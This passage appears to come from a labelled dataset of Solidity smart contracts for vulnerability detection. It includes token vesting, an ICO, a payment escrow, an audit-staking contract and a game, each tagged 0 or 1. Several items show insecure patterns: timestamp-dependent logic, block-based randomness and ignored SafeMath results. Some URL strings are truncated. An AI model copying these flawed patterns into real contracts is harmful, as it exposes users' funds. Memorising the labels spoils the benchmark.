ethRedeemed += withdrawVal;            msg.sender.transfer(withdrawVal);            emit eRedeem(msg.sender, AppliedUnits, withdrawVal);        } else {            tokenFunction.transfer(msg.sender, AppliedUnits);        }        Redeemer[msg.sender] = 0;        unRedeemedMTU -= AppliedUnits;    }    function getRedeemEst(address Claimer, uint256 NoOfTokens) public view returns(uint256 RedeemEstimate) {        uint WithdrawEther = redeemRate * NoOfTokens;        return WithdrawEther;    }}
0<CODESPLIT>contract MoatFund is Redeem {    event eNonIssueDeposits(address sender, uint value);    constructor(uint256 PrevRaisedEther, address rAddress) public {        ethRaised = PrevRaisedEther; // the ether raised value of previous smart contract        RegistryAddress = rAddress;    }    function NonIssueDeposits() public payable {        emit eNonIssueDeposits(msg.sender, msg.value);    }    function SendEtherToBoard(uint256 weiAmt) onlyAdmin public {        require(address(this).balance > unClaimedEther);                getAddress("board").transfer(weiAmt);    }    function SendEtherToAsset(uint256 weiAmt) onlyAdmin public {        require(address(this).balance > unClaimedEther);        getAddress("asset").transfer(weiAmt);    }    function SendEtherToDex(uint256 weiAmt) onlyAdmin public {        require(address(this).balance > unClaimedEther);                getAddress("dex").transfer(weiAmt);    }    function SendERC20ToAsset(address tokenAddress) onlyAdmin public {        token tokenFunctions = token(tokenAddress);        uint256 tokenBal = tokenFunctions.balanceOf(address(this));        tokenFunctions.transfer(getAddress("asset"), tokenBal);    }}
1<CODESPLIT>contract TokenTimelockVault {    mapping(address => TimeEnvoy) internal owners;    struct TimeEnvoy {        uint releaseTime;        uint balance;    }    function releasableAmount(address _owner) public view returns (uint256){        TimeEnvoy storage owner = owners[_owner];        if (block.timestamp >= owner.releaseTime) {            return owner.balance;        }    }}
1<CODESPLIT>contract CryptoJingles {    uint numOfPurchases;    uint NUM_SAMPLE_RANGE = 1000;    function randomGen(bytes32 blockHash, uint seed) constant public returns (uint randomNumber) {        return (uint(keccak256(blockHash, block.timestamp, numOfPurchases, seed )) % NUM_SAMPLE_RANGE);    }}
0<CODESPLIT>contract MyCryptoChampCore{    struct Champ {        uint id;        uint attackPower;        uint defencePower;        uint cooldownTime;         uint readyTime;        uint winCount;        uint lossCount;        uint position;         uint price;         uint withdrawCooldown;         uint eq_sword;         uint eq_shield;         uint eq_helmet;         bool forSale;     }        struct AddressInfo {        uint withdrawal;        uint champsCount;        uint itemsCount;        string name;    }    struct Item {        uint id;        uint8 itemType;         uint8 itemRarity;         uint attackPower;        uint defencePower;        uint cooldownReduction;        uint price;        uint onChampId;         bool onChamp;         bool forSale;    }        Champ[] public champs;    Item[] public items;    mapping (uint => uint) public leaderboard;    mapping (address => AddressInfo) public addressInfo;    mapping (bool => mapping(address => mapping (address => bool))) public tokenOperatorApprovals;    mapping (bool => mapping(uint => address)) public tokenApprovals;    mapping (bool => mapping(uint => address)) public tokenToOwner;    mapping (uint => string) public champToName;    mapping (bool => uint) public tokensForSaleCount;    uint public pendingWithdrawal = 0;    function addWithdrawal(address _address, uint _amount) public;    function clearTokenApproval(address _from, uint _tokenId, bool _isTokenChamp) public;    function setChampsName(uint _champId, string _name) public;    function setLeaderboard(uint _x, uint _value) public;    function setTokenApproval(uint _id, address _to, bool _isTokenChamp) public;    function setTokenOperatorApprovals(address _from, address _to, bool _approved, bool _isTokenChamp) public;    function setTokenToOwner(uint _id, address _owner, bool _isTokenChamp) public;    function setTokensForSaleCount(uint _value, bool _isTokenChamp) public;    function transferToken(address _from, address _to, uint _id, bool _isTokenChamp) public;    function newChamp(uint _attackPower,uint _defencePower,uint _cooldownTime,uint _winCount,uint _lossCount,uint _position,uint _price,uint _eq_sword, uint _eq_shield, uint _eq_helmet, bool _forSale,address _owner) public returns (uint);    function newItem(uint8 _itemType,uint8 _itemRarity,uint _attackPower,uint _defencePower,uint _cooldownReduction,uint _price,uint _onChampId,bool _onChamp,bool _forSale,address _owner) public returns (uint);    function updateAddressInfo(address _address, uint _withdrawal, bool _updatePendingWithdrawal, uint _champsCount, bool _updateChampsCount, uint _itemsCount, bool _updateItemsCount, string _name, bool _updateName) public;    function updateChamp(uint _champId, uint _attackPower,uint _defencePower,uint _cooldownTime,uint _readyTime,uint _winCount,uint _lossCount,uint _position,uint _price,uint _withdrawCooldown,uint _eq_sword, uint _eq_shield, uint _eq_helmet, bool _forSale) public;    function updateItem(uint _id,uint8 _itemType,uint8 _itemRarity,uint _attackPower,uint _defencePower,uint _cooldownReduction,uint _price,uint _onChampId,bool _onChamp,bool _forSale) public;    function getChampStats(uint256 _champId) public view returns(uint256,uint256,uint256);    function getChampsByOwner(address _owner) external view returns(uint256[]);    function getTokensForSale(bool _isTokenChamp) view external returns(uint256[]);    function getItemsByOwner(address _owner) external view returns(uint256[]);    function getTokenCount(bool _isTokenChamp) external view returns(uint);    function getTokenURIs(uint _tokenId, bool _isTokenChamp) public view returns(string);    function onlyApprovedOrOwnerOfToken(uint _id, address _msgsender, bool _isTokenChamp) external view returns(bool);    }
0<CODESPLIT>contract Inherit is Ownable{  address internal coreAddress;  MyCryptoChampCore internal core;  modifier onlyCore(){    require(msg.sender == coreAddress);    _;  }  function loadCoreAddress(address newCoreAddress) public onlyOwner {    require(newCoreAddress != address(0));    coreAddress = newCoreAddress;    core = MyCryptoChampCore(coreAddress);  }}
0<CODESPLIT>contract Strings {    function strConcat(string _a, string _b) internal pure returns (string){        bytes memory _ba = bytes(_a);        bytes memory _bb = bytes(_b);        string memory ab = new string(_ba.length + _bb.length);        bytes memory bab = bytes(ab);        uint k = 0;        for (uint i = 0; i < _ba.length; i++) bab[k++] = _ba[i];        for (i = 0; i < _bb.length; i++) bab[k++] = _bb[i];        return string(bab);    }    function uint2str(uint i) internal pure returns (string){        if (i == 0) return "0";        uint j = i;        uint len;        while (j != 0){            len++;            j /= 10;        }        bytes memory bstr = new bytes(len);        uint k = len - 1;        while (i != 0){            bstr[k--] = byte(48 + i % 10);            i /= 10;        }        return string(bstr);    }} interface EC {    function emitTransfer(address _from, address _to, uint _tokenId) external;  } 
1<CODESPLIT>contract Controller is Inherit, Strings {    using SafeMath for uint;     struct Champ {        uint id;          uint attackPower;        uint defencePower;        uint cooldownTime;          uint readyTime;          uint winCount;        uint lossCount;        uint position;          uint price;          uint withdrawCooldown;          uint eq_sword;         uint eq_shield;         uint eq_helmet;         bool forSale;      }    struct Item {        uint id;        uint8 itemType;          uint8 itemRarity;          uint attackPower;        uint defencePower;        uint cooldownReduction;        uint price;        uint onChampId;          bool onChamp;         bool forSale;      }    EC champsEC;    EC itemsEC;              modifier contractMinBalanceReached(){        uint pendingWithdrawal = core.pendingWithdrawal();        require( (address(core).balance).sub(pendingWithdrawal) > 1000000 );        _;    }        modifier onlyApprovedOrOwnerOfToken(uint _id, address _msgsender, bool _isTokenChamp)     {        require(core.onlyApprovedOrOwnerOfToken(_id, _msgsender, _isTokenChamp));        _;    }             function getChampReward(uint _position) public view returns(uint)     {        if(_position <= 800){                                                                uint rewardPercentage = uint(2000).sub(2 * (_position - 1));                         uint availableWithdrawal = address(coreAddress).balance.sub(core.pendingWithdrawal());                                      return availableWithdrawal / 1000000 * rewardPercentage;        }else{            return uint(0);        }    }    function setChampEC(address _address) public onlyOwner {        champsEC = EC(_address);    }    function setItemsEC(address _address) public onlyOwner {        itemsEC = EC(_address);    }    function changeChampsName(uint _champId, string _name, address _msgsender) external     onlyApprovedOrOwnerOfToken(_champId, _msgsender, true)    onlyCore    {        core.setChampsName(_champId, _name);    }         function withdrawChamp(uint _id, address _msgsender) external     onlyApprovedOrOwnerOfToken(_id, _msgsender, true)     contractMinBalanceReached      onlyCore     {        Champ memory champ = _getChamp(_id);        require(champ.position <= 800);         require(champ.withdrawCooldown < block.timestamp);          champ.withdrawCooldown = block.timestamp + 1 days;          _updateChamp(champ);          core.addWithdrawal(_msgsender, getChampReward(champ.position));    }             function _attackCompleted(Champ memory _winnerChamp, Champ memory _defeatedChamp, uint _pointsGiven) private     {                          _winnerChamp.attackPower += _pointsGiven;          _winnerChamp.defencePower += _pointsGiven;                                                     _defeatedChamp.attackPower = (_defeatedChamp.attackPower <= _pointsGiven + 2) ? 2 : _defeatedChamp.attackPower - _pointsGiven;                   _defeatedChamp.defencePower = (_defeatedChamp.defencePower <= _pointsGiven) ? 1 : _defeatedChamp.defencePower - _pointsGiven;                   _winnerChamp.winCount++;        _defeatedChamp.lossCount++;                             if(_winnerChamp.position > _defeatedChamp.position) {              uint winnerPosition = _winnerChamp.position;            uint loserPosition = _defeatedChamp.position;                    _defeatedChamp.position = winnerPosition;            _winnerChamp.position = loserPosition;        }        _updateChamp(_winnerChamp);        _updateChamp(_defeatedChamp);    }         function attack(uint _champId, uint _targetId, address _msgsender) external     onlyApprovedOrOwnerOfToken(_champId, _msgsender, true)     onlyCore     {        Champ memory myChamp = _getChamp(_champId);         Champ memory enemyChamp = _getChamp(_targetId);                 require (myChamp.readyTime <= block.timestamp);          require(_champId != _targetId);          require(core.tokenToOwner(true, _targetId) != address(0));              uint pointsGiven;          uint myChampAttackPower;          uint enemyChampDefencePower;         uint myChampCooldownReduction;                (myChampAttackPower,,myChampCooldownReduction) = core.getChampStats(_champId);        (,enemyChampDefencePower,) = core.getChampStats(_targetId);                 if (myChampAttackPower > enemyChampDefencePower) {                                                  if(myChampAttackPower - enemyChampDefencePower < 5){                pointsGiven = 6;              }else if(myChampAttackPower - enemyChampDefencePower < 10){                pointsGiven = 4;              }else{                pointsGiven = 2;              }                        _attackCompleted(myChamp, enemyChamp, pointsGiven/2);        } else {                                     pointsGiven = 2;            _attackCompleted(enemyChamp, myChamp, pointsGiven/2);                     }                         myChamp.readyTime = uint(block.timestamp + myChamp.cooldownTime - myChampCooldownReduction);        _updateChamp(myChamp);    }     function _cancelChampSale(Champ memory _champ) private      {                          _champ.forSale = false;                 _updateChamp(_champ);     }         function _transferChamp(address _from, address _to, uint _champId) private onlyCore    {        Champ memory champ = _getChamp(_champId);                 if(champ.forSale){             _cancelChampSale(champ);        }        core.clearTokenApproval(_from, _champId, true);                 (,uint toChampsCount,,) = core.addressInfo(_to);         (,uint fromChampsCount,,) = core.addressInfo(_from);        core.updateAddressInfo(_to,0,false,toChampsCount + 1,true,0,false,"",false);        core.updateAddressInfo(_from,0,false,fromChampsCount - 1,true,0,false,"",false);        core.setTokenToOwner(_champId, _to, true);        champsEC.emitTransfer(_from,_to,_champId);                 if(champ.eq_sword != 0) { _transferItem(_from, _to, champ.eq_sword); }        if(champ.eq_shield != 0) { _transferItem(_from, _to, champ.eq_shield); }        if(champ.eq_helmet != 0) { _transferItem(_from, _to, champ.eq_helmet); }    }    function transferToken(address _from, address _to, uint _id, bool _isTokenChamp) external    onlyCore{        if(_isTokenChamp){            _transferChamp(_from, _to, _id);        }else{            _transferItem(_from, _to, _id);        }    }    function cancelTokenSale(uint _id, address _msgsender, bool _isTokenChamp) public       onlyApprovedOrOwnerOfToken(_id, _msgsender, _isTokenChamp)      onlyCore     {        if(_isTokenChamp){            Champ memory champ = _getChamp(_id);            require(champ.forSale);              _cancelChampSale(champ);        }else{            Item memory item = _getItem(_id);          require(item.forSale);           _cancelItemSale(item);        }    }         function giveToken(address _to, uint _id, address _msgsender, bool _isTokenChamp) external       onlyApprovedOrOwnerOfToken(_id, _msgsender, _isTokenChamp)      onlyCore     {        if(_isTokenChamp){            _transferChamp(core.tokenToOwner(true,_id), _to, _id);        }else{             _transferItem(core.tokenToOwner(false,_id), _to, _id);        }    }    function setTokenForSale(uint _id, uint _price, address _msgsender, bool _isTokenChamp) external       onlyApprovedOrOwnerOfToken(_id, _msgsender, _isTokenChamp)       onlyCore     {        if(_isTokenChamp){            Champ memory champ = _getChamp(_id);            require(champ.forSale == false);              champ.forSale = true;            champ.price = _price;            _updateChamp(champ);                                 }else{            Item memory item = _getItem(_id);            require(item.forSale == false);            item.forSale = true;            item.price = _price;            _updateItem(item);                                 }    }    function _updateChamp(Champ memory champ) private     {        core.updateChamp(champ.id, champ.attackPower, champ.defencePower, champ.cooldownTime, champ.readyTime, champ.winCount, champ.lossCount, champ.position, champ.price, champ.withdrawCooldown, champ.eq_sword, champ.eq_shield, champ.eq_helmet, champ.forSale);    }    function _updateItem(Item memory item) private    {        core.updateItem(item.id, item.itemType, item.itemRarity, item.attackPower, item.defencePower, item.cooldownReduction,item.price, item.onChampId, item.onChamp, item.forSale);    }        function _getChamp(uint _champId) private view returns (Champ)    {        Champ memory champ;                         (champ.id, champ.attackPower, champ.defencePower, champ.cooldownTime, champ.readyTime, champ.winCount, champ.lossCount, champ.position,,,,,,) = core.champs(_champId);        (,,,,,,,,champ.price, champ.withdrawCooldown, champ.eq_sword, champ.eq_shield, champ.eq_helmet, champ.forSale) = core.champs(_champId);                return champ;    }        function _getItem(uint _itemId) private view returns (Item)    {        Item memory item;                         (item.id, item.itemType, item.itemRarity, item.attackPower, item.defencePower, item.cooldownReduction,,,,) = core.items(_itemId);        (,,,,,,item.price, item.onChampId, item.onChamp, item.forSale) = core.items(_itemId);                return item;    }    function getTokenURIs(uint _id, bool _isTokenChamp) public pure returns(string)    {        if(_isTokenChamp){            return strConcat('https:         }else{            return strConcat('https:         }    }    function _takeOffItem(uint _champId, uint8 _type) private    {        uint itemId;        Champ memory champ = _getChamp(_champId);        if(_type == 1){            itemId = champ.eq_sword;              if (itemId > 0) {                  champ.eq_sword = 0;              }        }        if(_type == 2){            itemId = champ.eq_shield;              if(itemId > 0) {                 champ.eq_shield = 0;              }        }        if(_type == 3){            itemId = champ.eq_helmet;              if(itemId > 0) {                  champ.eq_helmet = 0;              }        }        if(itemId > 0){            Item memory item = _getItem(itemId);            item.onChamp = false;            _updateItem(item);        }    }    function takeOffItem(uint _champId, uint8 _type, address _msgsender) public     onlyApprovedOrOwnerOfToken(_champId, _msgsender, true)     onlyCore    {            _takeOffItem(_champId, _type);    }    function putOn(uint _champId, uint _itemId, address _msgsender) external         onlyApprovedOrOwnerOfToken(_champId, _msgsender, true)         onlyApprovedOrOwnerOfToken(_itemId, _msgsender, false)         onlyCore         {            Champ memory champ = _getChamp(_champId);            Item memory item = _getItem(_itemId);                         if(item.onChamp){                _takeOffItem(item.onChampId, item.itemType);              }            item.onChamp = true;              item.onChampId = _champId;                           if(item.itemType == 1){                                 if(champ.eq_sword > 0){                    _takeOffItem(champ.id, 1);                }                champ.eq_sword = _itemId;              }            if(item.itemType == 2){                                 if(champ.eq_shield > 0){                    _takeOffItem(champ.id, 2);                }                champ.eq_shield = _itemId;              }            if(item.itemType == 3){                                 if(champ.eq_helmet > 0){                    _takeOffItem(champ.id, 3);                }                champ.eq_helmet = _itemId;              }            _updateChamp(champ);            _updateItem(item);    }    function _cancelItemSale(Item memory item) private {             item.forSale = false;                   _updateItem(item);    }    function _transferItem(address _from, address _to, uint _itemID) private     {        Item memory item = _getItem(_itemID);        if(item.forSale){              _cancelItemSale(item);        }                 if(item.onChamp && _to != core.tokenToOwner(true, item.onChampId)){          _takeOffItem(item.onChampId, item.itemType);        }        core.clearTokenApproval(_from, _itemID, false);                 (,,uint toItemsCount,) = core.addressInfo(_to);        (,,uint fromItemsCount,) = core.addressInfo(_from);        core.updateAddressInfo(_to,0,false,0,false,toItemsCount + 1,true,"",false);        core.updateAddressInfo(_from,0,false,0,false,fromItemsCount - 1,true,"",false);                core.setTokenToOwner(_itemID, _to,false);        itemsEC.emitTransfer(_from,_to,_itemID);    }    function forgeItems(uint _parentItemID, uint _childItemID, address _msgsender) external     onlyApprovedOrOwnerOfToken(_parentItemID, _msgsender, false)     onlyApprovedOrOwnerOfToken(_childItemID, _msgsender, false)     onlyCore    {                 require(_parentItemID != _childItemID);                Item memory parentItem = _getItem(_parentItemID);        Item memory childItem = _getItem(_childItemID);                         if(parentItem.forSale){          _cancelItemSale(parentItem);        }                         if(childItem.forSale){          _cancelItemSale(childItem);        }                 if(childItem.onChamp){            _takeOffItem(childItem.onChampId, childItem.itemType);        }                 parentItem.attackPower = (parentItem.attackPower > childItem.attackPower) ? parentItem.attackPower : childItem.attackPower;        parentItem.defencePower = (parentItem.defencePower > childItem.defencePower) ? parentItem.defencePower : childItem.defencePower;        parentItem.cooldownReduction = (parentItem.cooldownReduction > childItem.cooldownReduction) ? parentItem.cooldownReduction : childItem.cooldownReduction;        parentItem.itemRarity = uint8(6);        _updateItem(parentItem);                 _transferItem(core.tokenToOwner(false,_childItemID), address(0), _childItemID);    }}
1<CODESPLIT> contract DividendPool {    uint256 public totalDividents = 0;    function startDividents(uint256 from, uint256 amount) external {      require(from > block.timestamp);      require(amount > 0);      totalDividents = amount;    }}
1<CODESPLIT>contract UnitedfansTokenCrowdsale {    enum State { BeforeSale, NormalSale, ShouldFinalize, SaleOver }    State public state = State.BeforeSale;    uint256 public endTime;    function finalization() internal {        endTime = block.timestamp;        state = State.SaleOver;        return;    }}
0<CODESPLIT>contract BatchReleaser {        function batchRelease(address[] vestingContracts, ERC20Basic token) external {        for (uint256 i = 0; i < vestingContracts.length; i++) {            VariableRateTokenVesting vesting = VariableRateTokenVesting(vestingContracts[i]);            vesting.release(token);        }    }    }
1<CODESPLIT>contract EchoLinkToken {    address public saleTeamAddress;    uint64 contractCreatedDatetime;    function EchoLinkToken(address _saleTeamAddress) public {        saleTeamAddress = _saleTeamAddress;        contractCreatedDatetime = uint64(block.timestamp);        return;    }}
1<CODESPLIT>contract RakuRakuEth {  using SafeMath for uint256;  enum Status {    Pending,    Requested,    Canceled,    Paid,    Rejected  }    struct Payment {    uint256 amountJpy;    uint256 amountWei;    uint256 rateEthJpy;    uint256 paymentDue;    uint256 requestedTime;    Status status;    }    address public owner;  address public creditor;  address public debtor;  uint256 ethWei = 10**18;  Payment[] payments;  mapping (address => uint256) balances;    modifier onlyCreditor() {    require(msg.sender == creditor);    _;  }    modifier onlyDebtor() {    require(msg.sender == debtor);    _;  }    modifier onlyStakeholders() {    require(msg.sender == debtor || msg.sender == creditor);    _;  }  constructor (address _creditor, address _debtor) public {    owner = msg.sender;    creditor = _creditor;    debtor = _debtor;  }       function getCurrentTimestamp () external view returns (uint256 timestamp) {    return block.timestamp;  }  function collectPayment(uint256 _index) external returns (bool) {    require(payments[_index].status == Status.Requested);    require(payments[_index].requestedTime + 24*60*60 < block.timestamp);    require(balances[debtor] >= payments[_index].amountWei);    balances[debtor] = balances[debtor].sub(payments[_index].amountWei);    balances[creditor] = balances[creditor].add(payments[_index].amountWei);    payments[_index].status = Status.Paid;    return true;  }       function getBalance(address _address) external view returns (uint256 balance) {    return balances[_address];  }    function getPayment(uint256 _index) external view returns (uint256 amountJpy, uint256 amountWei, uint256 rateEthJpy, uint256 paymentDue, uint256 requestedTime, Status status) {    Payment memory pm = payments[_index];    return (pm.amountJpy, pm.amountWei, pm.rateEthJpy, pm.paymentDue, pm.requestedTime, pm.status);  }    function getNumPayments() external view returns (uint256 num) {    return payments.length;  }    function withdraw(uint256 _amount) external returns (bool) {    require(balances[msg.sender] >= _amount);    msg.sender.transfer(_amount);    balances[msg.sender] = balances[msg.sender].sub(_amount);    return true;  }       function addPayment(uint256 _amountJpy, uint256 _paymentDue) external onlyCreditor returns (uint256 index) {    payments.push(Payment(_amountJpy, 0, 0, _paymentDue, 0, Status.Pending));    return payments.length-1;  }    function requestPayment(uint256 _index, uint256 _rateEthJpy) external onlyCreditor returns (bool) {    require(payments[_index].status == Status.Pending || payments[_index].status == Status.Rejected);    require(payments[_index].paymentDue <= block.timestamp);    payments[_index].rateEthJpy = _rateEthJpy;    payments[_index].amountWei = payments[_index].amountJpy.mul(ethWei).div(_rateEthJpy);    payments[_index].requestedTime = block.timestamp;    payments[_index].status = Status.Requested;    return true;  }    function cancelPayment(uint256 _index) external onlyCreditor returns (bool) {    require(payments[_index].status != Status.Paid);    payments[_index].status = Status.Canceled;    return true;  }     function () external payable onlyDebtor {    balances[msg.sender] = balances[msg.sender].add(msg.value);  }    function rejectPayment(uint256 _index) external onlyDebtor returns (bool) {    require(payments[_index].status == Status.Requested);    require(payments[_index].requestedTime + 24*60*60 > block.timestamp);    payments[_index].status = Status.Rejected;    return true;  }    function approvePayment(uint256 _index) external onlyDebtor returns (bool) {    require(payments[_index].status == Status.Requested);    require(balances[debtor] >= payments[_index].amountWei);    balances[debtor] = balances[debtor].sub(payments[_index].amountWei);    balances[creditor] = balances[creditor].add(payments[_index].amountWei);    payments[_index].status = Status.Paid;    return true;  }}
1<CODESPLIT>contract BGAudit is Ownable {    using SafeMath for uint;    event AddedAuditor(address indexed auditor);    event BannedAuditor(address indexed auditor);    event AllowedAuditor(address indexed auditor);    event CreatedAudit(uint indexed id);    event ReviewingAudit(uint indexed id);    event AuditorRewarded(uint indexed id, address indexed auditor, uint indexed reward);    event AuditorStaked(uint indexed id, address indexed auditor, uint indexed amount);    event WithdrawedStake(uint indexed id, address indexed auditor, uint indexed amount);    event SlashedStake(uint indexed id, address indexed auditor);    enum AuditStatus { New, InProgress, InReview, Completed }    struct Auditor {        bool banned;        address addr;        uint totalEarned;        uint completedAudits;        uint[] stakedAudits;          mapping(uint => bool) stakedInAudit;          mapping(uint => bool) canWithdrawStake;      }    struct Audit {        AuditStatus status;        address owner;        uint id;        uint totalReward;          uint remainingReward;          uint stake;          uint endTime;          uint maxAuditors;          address[] participants;      }         uint public stakePeriod = 90 days;      uint public maxAuditDuration = 365 days;      Audit[] public audits;    mapping(address => Auditor) public auditors;         function transfer(address _to, uint _amountInWei) external onlyOwner {        require(address(this).balance > _amountInWei);        _to.transfer(_amountInWei);    }    function setStakePeriod(uint _days) external onlyOwner {        stakePeriod = _days * 1 days;    }    function setMaxAuditDuration(uint _days) external onlyOwner {        maxAuditDuration = _days * 1 days;    }         function addAuditor(address _auditor) external onlyOwner {        require(auditors[_auditor].addr == address(0));          auditors[_auditor].banned = false;        auditors[_auditor].addr = _auditor;        auditors[_auditor].completedAudits = 0;        auditors[_auditor].totalEarned = 0;        emit AddedAuditor(_auditor);    }    function banAuditor(address _auditor) external onlyOwner {        require(auditors[_auditor].addr != address(0));        auditors[_auditor].banned = true;        emit BannedAuditor(_auditor);    }    function allowAuditor(address _auditor) external onlyOwner {        require(auditors[_auditor].addr != address(0));        auditors[_auditor].banned = false;        emit AllowedAuditor(_auditor);    }         function createAudit(uint _stake, uint _endTimeInDays, uint _maxAuditors) external payable onlyOwner {        uint endTime = _endTimeInDays * 1 days;        require(endTime < maxAuditDuration);        require(block.timestamp + endTime * 1 days > block.timestamp);        require(msg.value > 0 && _maxAuditors > 0 && _stake > 0);        Audit memory audit;        audit.status = AuditStatus.New;        audit.owner = msg.sender;        audit.id = audits.length;        audit.totalReward = msg.value;        audit.remainingReward = audit.totalReward;        audit.stake = _stake;        audit.endTime = block.timestamp + endTime;        audit.maxAuditors = _maxAuditors;        audits.push(audit);          emit CreatedAudit(audit.id);    }    function reviewAudit(uint _id) external onlyOwner {        require(audits[_id].status == AuditStatus.InProgress);        require(block.timestamp >= audits[_id].endTime);        audits[_id].endTime = block.timestamp;          audits[_id].status = AuditStatus.InReview;        emit ReviewingAudit(_id);    }    function rewardAuditor(uint _id, address _auditor, uint _reward) external onlyOwner {        audits[_id].remainingReward.sub(_reward);        audits[_id].status = AuditStatus.Completed;        auditors[_auditor].totalEarned.add(_reward);        auditors[_auditor].completedAudits.add(1);        auditors[_auditor].canWithdrawStake[_id] = true;          _auditor.transfer(_reward);        emit AuditorRewarded(_id, _auditor, _reward);    }    function slashStake(uint _id, address _auditor) external onlyOwner {        require(auditors[_auditor].addr != address(0));        require(auditors[_auditor].stakedInAudit[_id]);          auditors[_auditor].canWithdrawStake[_id] = false;        emit SlashedStake(_id, _auditor);    }         function stake(uint _id) public payable {                 require(msg.value == audits[_id].stake);        require(block.timestamp < audits[_id].endTime);        require(audits[_id].participants.length < audits[_id].maxAuditors);        require(audits[_id].status == AuditStatus.New || audits[_id].status == AuditStatus.InProgress);                 require(auditors[msg.sender].addr == msg.sender && !auditors[msg.sender].banned);          require(!auditors[msg.sender].stakedInAudit[_id]);                   audits[_id].status = AuditStatus.InProgress;        audits[_id].participants.push(msg.sender);                 auditors[msg.sender].stakedInAudit[_id] = true;        auditors[msg.sender].stakedAudits.push(_id);        emit AuditorStaked(_id, msg.sender, msg.value);    }    function withdrawStake(uint _id) public {        require(audits[_id].status == AuditStatus.Completed);        require(auditors[msg.sender].canWithdrawStake[_id]);        require(block.timestamp >= audits[_id].endTime + stakePeriod);        auditors[msg.sender].canWithdrawStake[_id] = false;          address(msg.sender).transfer(audits[_id].stake);          emit WithdrawedStake(_id, msg.sender, audits[_id].stake);    }         function auditorHasStaked(uint _id, address _auditor) public view returns(bool) {        return auditors[_auditor].stakedInAudit[_id];    }    function auditorCanWithdrawStake(uint _id, address _auditor) public view returns(bool) {        if(auditors[_auditor].stakedInAudit[_id] && auditors[_auditor].canWithdrawStake[_id]) {            return true;        }        return false;    }         function getStakedAudits(address _auditor) public view returns(uint[]) {        return auditors[_auditor].stakedAudits;    }         function getAuditors(uint _id) public view returns(address[]) {        return audits[_id].participants;    }}
0<CODESPLIT>contract Whitelisted is Ownable {         bool public whitelistEnabled = true;         mapping(address => bool) public whitelist;    event ICOWhitelisted(address indexed addr);    event ICOBlacklisted(address indexed addr);    modifier onlyWhitelisted {        require(!whitelistEnabled || whitelist[msg.sender]);        _;    }         function whitelist(address address_) external onlyOwner {        whitelist[address_] = true;        emit ICOWhitelisted(address_);    }         function blacklist(address address_) external onlyOwner {        delete whitelist[address_];        emit ICOBlacklisted(address_);    }         function whitelisted(address address_) public view returns (bool) {        if (whitelistEnabled) {            return whitelist[address_];        } else {            return true;        }    }         function enableWhitelist() public onlyOwner {        whitelistEnabled = true;    }         function disableWhitelist() public onlyOwner {        whitelistEnabled = false;    }} interface ERC20Token {    function balanceOf(address owner_) external returns (uint);    function allowance(address owner_, address spender_) external returns (uint);    function transferFrom(address from_, address to_, uint value_) external returns (bool);}  
1<CODESPLIT>contract BaseICO is Ownable, Whitelisted {         enum State {                 Inactive,                          Active,                                   Suspended,                 Terminated,                          NotCompleted,                          Completed    }         ERC20Token public token;         State public state;         uint public startAt;         uint public endAt;         uint public lowCapWei;              uint public hardCapWei;         uint public lowCapTxWei;         uint public hardCapTxWei;         uint public collectedWei;         uint public tokensSold;         address public teamWallet;         event ICOStarted(uint indexed endAt, uint lowCapWei, uint hardCapWei, uint lowCapTxWei, uint hardCapTxWei);    event ICOResumed(uint indexed endAt, uint lowCapWei, uint hardCapWei, uint lowCapTxWei, uint hardCapTxWei);    event ICOSuspended();    event ICOTerminated();    event ICONotCompleted();    event ICOCompleted(uint collectedWei);    event ICOInvestment(address indexed from, uint investedWei, uint tokens, uint8 bonusPct);    modifier isSuspended() {        require(state == State.Suspended);        _;    }    modifier isActive() {        require(state == State.Active);        _;    }         function start(uint endAt_) public onlyOwner {        require(endAt_ > block.timestamp && state == State.Inactive);        endAt = endAt_;        startAt = block.timestamp;        state = State.Active;        emit ICOStarted(endAt, lowCapWei, hardCapWei, lowCapTxWei, hardCapTxWei);    }         function suspend() public onlyOwner isActive {        state = State.Suspended;        emit ICOSuspended();    }         function terminate() public onlyOwner {        require(state != State.Terminated &&        state != State.NotCompleted &&        state != State.Completed);        state = State.Terminated;        emit ICOTerminated();    }         function tune(uint endAt_,        uint lowCapWei_,        uint hardCapWei_,        uint lowCapTxWei_,        uint hardCapTxWei_) public onlyOwner isSuspended {        if (endAt_ > block.timestamp) {            endAt = endAt_;        }        if (lowCapWei_ > 0) {            lowCapWei = lowCapWei_;        }        if (hardCapWei_ > 0) {            hardCapWei = hardCapWei_;        }        if (lowCapTxWei_ > 0) {            lowCapTxWei = lowCapTxWei_;        }        if (hardCapTxWei_ > 0) {            hardCapTxWei = hardCapTxWei_;        }        require(lowCapWei <= hardCapWei && lowCapTxWei <= hardCapTxWei);        touch();    }         function resume() public onlyOwner isSuspended {        state = State.Active;        emit ICOResumed(endAt, lowCapWei, hardCapWei, lowCapTxWei, hardCapTxWei);        touch();    }         function touch() public;         function buyTokens() public payable;         function forwardFunds() internal {        teamWallet.transfer(msg.value);    }}  library SafeMath {    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        if (a == 0) {            return 0;        }        uint256 c = a * b;        assert(c / a == b);        return c;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a / b;        return c;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        assert(b <= a);        return a - b;    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a + b;        assert(c >= a);        return c;    }}  
1<CODESPLIT>contract IonChainICO is BaseICO {    using SafeMath for uint;         uint internal constant ONE_TOKEN = 1e6;         uint public constant ETH_TOKEN_EXCHANGE_RATIO = 125000;         address public tokenHolder;         uint public constant PERSONAL_CAP = 1.6 ether;         uint public personalCapEndAt;         mapping(address => uint) internal personalPurchases;    constructor(address icoToken_,            address teamWallet_,            address tokenHolder_,            uint lowCapWei_,            uint hardCapWei_,            uint lowCapTxWei_,            uint hardCapTxWei_) public {        require(icoToken_ != address(0) && teamWallet_ != address(0));        token = ERC20Token(icoToken_);        teamWallet = teamWallet_;        tokenHolder = tokenHolder_;        state = State.Inactive;        lowCapWei = lowCapWei_;        hardCapWei = hardCapWei_;        lowCapTxWei = lowCapTxWei_;        hardCapTxWei = hardCapTxWei_;    }         function() external payable {        buyTokens();    }    function start(uint endAt_) onlyOwner public {        uint requireTokens = hardCapWei.mul(ETH_TOKEN_EXCHANGE_RATIO).mul(ONE_TOKEN).div(1 ether);        require(token.balanceOf(tokenHolder) >= requireTokens            && token.allowance(tokenHolder, address(this)) >= requireTokens);        personalCapEndAt = block.timestamp + 48 hours;        super.start(endAt_);    }         function touch() public {        if (state != State.Active && state != State.Suspended) {            return;        }        if (collectedWei >= hardCapWei) {            state = 